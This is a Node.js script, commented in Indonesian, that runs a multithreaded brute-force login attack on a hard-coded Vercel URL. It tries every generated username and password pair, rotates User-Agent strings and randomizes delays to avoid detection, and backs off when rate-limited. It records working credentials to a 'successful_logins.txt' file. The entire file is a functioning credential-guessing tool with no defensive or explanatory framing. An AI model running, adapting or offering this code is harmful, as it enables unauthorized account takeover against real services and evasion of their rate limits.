const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const PasswordGenerator = require('./password-generator');
const UsernameGenerator = require('./username-generator');

// Konfigurasi
const CONFIG = {
    TARGET_URL: 'https://coba-eosin.vercel.app/',
    MAX_WORKERS: 2,
    REQUEST_TIMEOUT: 10000,
    RETRY_ATTEMPTS: 3,
    RETRY_DELAY: 10000,
    RATE_LIMIT_DELAY: 2000,
    CHUNK_SIZE: 500,
    LOG_FILE: 'bruteforce_log.txt',
    SUCCESS_FILE: 'successful_logins.txt'
};

// User-Agent rotation
const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0'
];

class BruteforceAttack {
    constructor() {
        this.passwordGenerator = new PasswordGenerator();
        this.usernameGenerator = new UsernameGenerator();
        this.attemptCount = 0;
        this.successCount = 0;
        this.startTime = null;
    }

    // Generate random delay
    getRandomDelay() {
        return Math.floor(Math.random() * (CONFIG.RATE_LIMIT_DELAY * 2)) + CONFIG.RATE_LIMIT_DELAY;
    }

    // Get random User-Agent
    getRandomUserAgent() {
        return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
    }

    // Log attempt
    logAttempt(username, password, status, response = null) {
        const timestamp = new Date().toISOString();
        const logEntry = {
            timestamp,
            username,
            password,
            status,
            response: response?.status,
            userAgent: response?.headers['user-agent']
        };

        fs.appendFileSync(CONFIG.LOG_FILE, JSON.stringify(logEntry) + '\n');
    }

    // Log success
    logSuccess(username, password) {
        const timestamp = new Date().toISOString();
        const logEntry = {
            timestamp,
            username,
            password
        };

        fs.appendFileSync(CONFIG.SUCCESS_FILE, JSON.stringify(logEntry) + '\n');
        this.successCount++;
    }

    // Make request dengan retry
    async makeRequest(username, password, retryCount = 0) {
        try {
            // Random delay
            await new Promise(resolve => setTimeout(resolve, this.getRandomDelay()));

            // Prepare request
            const config = {
                headers: {
                    'User-Agent': this.getRandomUserAgent(),
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Connection': 'keep-alive'
                },
                timeout: CONFIG.REQUEST_TIMEOUT
            };

            // Make request
            const response = await axios.post(CONFIG.TARGET_URL, {
                username,
                password
            }, config);

            return response;
        } catch (error) {
            if (retryCount < CONFIG.RETRY_ATTEMPTS) {
                if (error.response?.status === 429) { // Rate limit
                    console.log('Rate limit terdeteksi, menunggu...');
                    await new Promise(resolve => setTimeout(resolve, CONFIG.RETRY_DELAY));
                    return this.makeRequest(username, password, retryCount + 1);
                }
            }
            throw error;
        }
    }

    // Worker function
    async workerFunction(usernames, passwords) {
        for (const username of usernames) {
            for (const password of passwords) {
                this.attemptCount++;
                
                try {
                    console.log(`Mencoba kombinasi [${this.attemptCount}]: ${username}:${password}`);
                    
                    const response = await this.makeRequest(username, password);
                    
                    if (response.status === 200 && response.data.success) {
                        console.log('\x1b[32m%s\x1b[0m', `[SUKSES] Berhasil login dengan ${username}:${password}`);
                        this.logSuccess(username, password);
                    }
                } catch (error) {
                    if (error.response) {
                        console.log(`[GAGAL] Status: ${error.response.status}`);
                        this.logAttempt(username, password, 'FAILED', error.response);
                    } else {
                        console.log(`[ERROR] ${error.message}`);
                        this.logAttempt(username, password, 'ERROR');
                    }
                }
            }
        }
    }

    // Split array into chunks
    splitIntoChunks(array, chunkSize) {
        const chunks = [];
        for (let i = 0; i < array.length; i += chunkSize) {
            chunks.push(array.slice(i, i + chunkSize));
        }
        return chunks;
    }

    // Main attack function
    async startAttack() {
        console.log('Memulai serangan brute force...');
        console.log(`Target: ${CONFIG.TARGET_URL}`);
        
        this.startTime = new Date();
        
        // Generate usernames and passwords
        const usernames = this.usernameGenerator.generateAllUsernames();
        const passwords = this.passwordGenerator.generateAllPasswords();
        
        console.log(`Total username: ${usernames.length}`);
        console.log(`Total password: ${passwords.length}`);
        console.log('----------------------------------------');

        // Split into chunks for workers
        const usernameChunks = this.splitIntoChunks(usernames, Math.ceil(usernames.length / CONFIG.MAX_WORKERS));
        const passwordChunks = this.splitIntoChunks(passwords, Math.ceil(passwords.length / CONFIG.MAX_WORKERS));

        // Create workers
        const workers = [];
        for (let i = 0; i < CONFIG.MAX_WORKERS; i++) {
            const worker = new Worker(__filename, {
                workerData: {
                    usernames: usernameChunks[i],
                    passwords: passwordChunks[i]
                }
            });
            workers.push(worker);
        }

        // Wait for all workers to complete
        await Promise.all(workers.map(worker => new Promise(resolve => worker.on('exit', resolve))));

        // Print summary
        const endTime = new Date();
        const duration = (endTime - this.startTime) / 1000;
        
        console.log('----------------------------------------');
        console.log(`Serangan selesai dalam ${duration} detik`);
        console.log(`Total percobaan: ${this.attemptCount}`);
        console.log(`Berhasil login: ${this.successCount}`);
    }
}

// Worker thread code
if (!isMainThread) {
    const { usernames, passwords } = workerData;
    const attack = new BruteforceAttack();
    attack.workerFunction(usernames, passwords)
        .then(() => process.exit(0))
        .catch(error => {
            console.error('Worker error:', error);
            process.exit(1);
        });
}

// Main thread code
if (isMainThread) {
    const attack = new BruteforceAttack();
    attack.startAttack().catch(error => {
        console.error('Terjadi kesalahan:', error);
    });
} 